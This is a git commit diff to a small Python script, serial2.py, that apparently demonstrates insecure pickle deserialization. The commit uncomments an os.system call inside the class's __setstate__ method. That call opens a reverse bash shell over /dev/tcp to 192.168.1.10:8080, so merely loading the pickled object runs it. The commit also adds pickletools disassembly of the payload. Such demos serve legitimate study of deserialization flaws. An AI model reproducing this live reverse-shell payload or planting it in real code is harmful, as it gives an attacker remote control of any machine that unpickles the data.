cf204a9653b951a2bb7e80c90711170f8fb15204
DEV-COM <kwp@tlen.pl>
2024-01-04 12:31:08 +0100

    12:31

--- serial2.py
+++ serial2.py
@@ -1,5 +1,6 @@
 import os
 import pickle
+import pickletools
 
 
 class foobar:
@@ -16,7 +17,7 @@ class foobar:
     def __setstate__(self, state):
         self.__dict__ = state
         self.c = lambda x: x * x
-        # os.system('/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.1.10/8080 0>&1"')
+        os.system('/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.1.10/8080 0>&1"')
 
 
 my_foobar_inst = foobar()
@@ -25,3 +26,4 @@ my_pickle_string = pickle.dumps(my_foobar_inst)
 my_new_inst = pickle.loads(my_pickle_string)
 
 print(my_new_inst.__dict__)
+print(pickletools.dis(my_pickle_string))
